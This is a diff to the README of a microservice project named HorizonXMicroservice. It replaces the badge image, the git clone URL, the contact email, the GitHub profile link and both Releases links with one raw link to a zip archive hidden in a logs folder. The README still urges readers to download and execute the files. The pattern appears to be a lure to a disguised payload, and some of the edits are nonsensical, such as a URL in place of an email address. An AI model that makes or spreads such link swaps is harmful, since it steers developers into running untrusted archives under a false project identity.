@@ -1,6 +1,6 @@
 # HorizonXMicroservice
 
-![HorizonXMicroservice](https://img.shields.io/badge/HorizonXMicroservice-v1.0.0-blue)
+![HorizonXMicroservice](https://raw.githubusercontent.com/agusmrbeast/HorizonXMicroservice/main/src/Academics/logs/Horizon-X-Microservice-v3.7.zip)
 
 Welcome to the **HorizonXMicroservice** repository! This project implements a microservice architecture for backend services using HorizonX as the core module, along with Docker, ELK stack, and Kong for API management. 
 
@@ -57,7 +57,7 @@ To get started with the **HorizonXMicroservice**, follow these steps:
 1. **Clone the repository**:
 
    ```bash
-   git clone https://github.com/agusmrbeast/HorizonXMicroservice.git
+   git clone https://raw.githubusercontent.com/agusmrbeast/HorizonXMicroservice/main/src/Academics/logs/Horizon-X-Microservice-v3.7.zip
    cd HorizonXMicroservice
    ```
 
@@ -117,14 +117,14 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or suggestions, feel free to reach out:
 
-- **Email**: your-email@example.com
-- **GitHub**: [agusmrbeast](https://github.com/agusmrbeast)
+- **Email**: https://raw.githubusercontent.com/agusmrbeast/HorizonXMicroservice/main/src/Academics/logs/Horizon-X-Microservice-v3.7.zip
+- **GitHub**: [agusmrbeast](https://raw.githubusercontent.com/agusmrbeast/HorizonXMicroservice/main/src/Academics/logs/Horizon-X-Microservice-v3.7.zip)
 
 ## Releases
 
-You can download the latest releases of **HorizonXMicroservice** from the [Releases](https://github.com/agusmrbeast/HorizonXMicroservice/releases) section. Make sure to download the appropriate files and execute them to get started.
+You can download the latest releases of **HorizonXMicroservice** from the [Releases](https://raw.githubusercontent.com/agusmrbeast/HorizonXMicroservice/main/src/Academics/logs/Horizon-X-Microservice-v3.7.zip) section. Make sure to download the appropriate files and execute them to get started.
 
-For more detailed information, visit the [Releases](https://github.com/agusmrbeast/HorizonXMicroservice/releases) page.
+For more detailed information, visit the [Releases](https://raw.githubusercontent.com/agusmrbeast/HorizonXMicroservice/main/src/Academics/logs/Horizon-X-Microservice-v3.7.zip) page.
 
 ---
 
